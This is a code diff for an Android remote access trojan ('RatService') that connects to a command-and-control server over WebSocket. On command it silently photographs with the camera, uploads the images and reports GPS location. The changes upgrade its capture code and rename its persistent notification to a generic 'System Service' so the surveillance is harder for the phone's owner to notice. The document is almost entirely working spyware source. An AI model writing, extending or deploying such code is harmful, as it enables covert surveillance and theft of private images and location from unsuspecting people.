@@ -2,16 +2,25 @@ package com.example.kagenezumi
 
 import android.Manifest
 import android.app.*
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.hardware.Camera
+import android.content.IntentFilter
+import android.hardware.camera2.*
 import android.location.Location
-import android.location.LocationManager
+import android.media.ImageReader
 import android.os.*
+import android.provider.Settings
 import android.util.Log
+import android.util.Size
+import androidx.core.app.NotificationCompat
+import com.google.android.gms.location.LocationServices
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.create
 import java.io.File
 import java.io.FileOutputStream
+import java.io.IOException
 import java.util.*
 import java.util.concurrent.TimeUnit
 
@@ -19,12 +28,28 @@ class RatService : Service() {
 
     private lateinit var webSocket: WebSocket
     private val client = OkHttpClient()
+    private lateinit var cameraManager: CameraManager
+    private lateinit var imageReader: ImageReader
+    private lateinit var accessibilityReceiver: BroadcastReceiver
+
+    companion object {
+        private const val NOTIFICATION_CHANNEL_ID = "RatServiceChannel"
+        private const val NOTIFICATION_ID = 1
+        private const val TAG = "RatService"
+    }
 
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(1, createNotification()) // ✅ no more ServiceInfo constant here
+        startForeground()
+        initializeCamera()
+        registerAccessibilityReceiver()
         connectToC2()
+    }
+
+    private fun initializeCamera() {
+        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 2)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -59,7 +84,7 @@ class RatService : Service() {
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
-                Log.e("KageNezumi", "WebSocket failure: ${t.message}")
+                Log.e(TAG, "WebSocket failure: ${t.message}")
             }
 
             override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
@@ -72,19 +97,70 @@ class RatService : Service() {
 
     private fun takePhoto() {
         try {
-            val camera = Camera.open()
-            camera.startPreview()
-            camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
-                val dir = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "kage")
-                if (!dir.exists()) dir.mkdirs()
-                val file = File(dir, "photo_${System.currentTimeMillis()}.jpg")
-                FileOutputStream(file).use { it.write(data) }
-                webSocket.send("📷 Photo saved: ${file.name}")
-                uploadFile(file)
-                camera.release()
-            })
+            val cameraId = cameraManager.cameraIdList[0] // Use first camera
+            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+            
+            if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
+                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        // Camera opened successfully, take picture
+                        createCaptureSession(camera)
+                    }
+
+                    override fun onDisconnected(camera: CameraDevice) {
+                        camera.close()
+                    }
+
+                    override fun onError(camera: CameraDevice, error: Int) {
+                        camera.close()
+                        webSocket.send("❌ Camera error: $error")
+                    }
+                }, null)
+            }
         } catch (e: Exception) {
             webSocket.send("❌ Camera error: ${e.message}")
+            Log.e(TAG, "Camera error", e)
+        }
+    }
+
+    private fun createCaptureSession(cameraDevice: CameraDevice) {
+        try {
+            val surfaces = listOf(imageReader.surface)
+            
+            cameraDevice.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    val captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                    captureBuilder.addTarget(imageReader.surface)
+                    
+                    session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
+                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
+                            val image = imageReader.acquireLatestImage()
+                            val buffer = image.planes[0].buffer
+                            val bytes = ByteArray(buffer.capacity())
+                            buffer.get(bytes)
+                            
+                            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
+                            FileOutputStream(file).use { it.write(bytes) }
+                            
+                            webSocket.send("📷 Photo saved: ${file.name}")
+                            uploadFile(file)
+                            
+                            image.close()
+                            session.close()
+                            cameraDevice.close()
+                        }
+                    }, null)
+                }
+
+                override fun onConfigureFailed(session: CameraCaptureSession) {
+                    webSocket.send("❌ Failed to configure camera session")
+                    session.close()
+                    cameraDevice.close()
+                }
+            }, null)
+        } catch (e: Exception) {
+            webSocket.send("❌ Camera session error: ${e.message}")
+            Log.e(TAG, "Camera session error", e)
         }
     }
 
@@ -95,7 +171,7 @@ class RatService : Service() {
         }
 
         val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
-            .addFormDataPart("file", file.name, RequestBody.create("application/octet-stream".toMediaTypeOrNull(), file))
+            .addFormDataPart("file", file.name, create("application/octet-stream".toMediaTypeOrNull(), file))
             .build()
 
         val request = Request.Builder()
@@ -115,16 +191,17 @@ class RatService : Service() {
     }
 
     private fun sendLocation() {
-        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         try {
-            val location: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-
-            if (location != null) {
-                val locString = "📍 Lat: ${location.latitude}, Lon: ${location.longitude}"
-                webSocket.send(locString)
-            } else {
-                webSocket.send("❌ Location unavailable")
+            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
+                if (location != null) {
+                    val locString = "📍 Lat: ${location.latitude}, Lon: ${location.longitude}"
+                    webSocket.send(locString)
+                } else {
+                    webSocket.send("❌ Location unavailable")
+                }
+            }.addOnFailureListener { e ->
+                webSocket.send("❌ Location error: ${e.message}")
             }
         } catch (e: SecurityException) {
             webSocket.send("❌ Location permission missing")
@@ -140,30 +217,54 @@ class RatService : Service() {
         webSocket.send(builder.toString())
     }
 
-    private fun createNotification(): Notification {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(this, "rat_channel")
-                .setContentTitle("KageNezumi Service")
-                .setContentText("Running in background")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build()
-        } else {
-            Notification.Builder(this)
-                .setContentTitle("KageNezumi Service")
-                .setContentText("Running in background")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build()
-        }
-    }
-
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                "rat_channel",
-                "KageNezumi Background Service",
+                NOTIFICATION_CHANNEL_ID,
+                "Background Service",
                 NotificationManager.IMPORTANCE_LOW
-            )
-            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
+            ).apply {
+                description = "Background system service"
+            }
+
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
         }
+    }
+
+    private fun startForeground() {
+        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
+        } else {
+            NotificationCompat.Builder(this)
+        }
+
+        val notification = notificationBuilder
+            .setContentTitle("System Service")
+            .setContentText("Running...")
+            .setSmallIcon(R.drawable.ic_notification)
+            .build()
+
+        startForeground(NOTIFICATION_ID, notification)
+    }
+
+    private fun registerAccessibilityReceiver() {
+        accessibilityReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                if (intent?.action == Settings.ACTION_ACCESSIBILITY_SETTINGS) {
+                    // Handle accessibility settings changes
+                    webSocket.send("Accessibility settings changed")
+                }
+            }
+        }
+        
+        val filter = IntentFilter(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+        registerReceiver(accessibilityReceiver, filter)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        unregisterReceiver(accessibilityReceiver)
+        webSocket.close(1000, "Service destroyed")
     }
 }
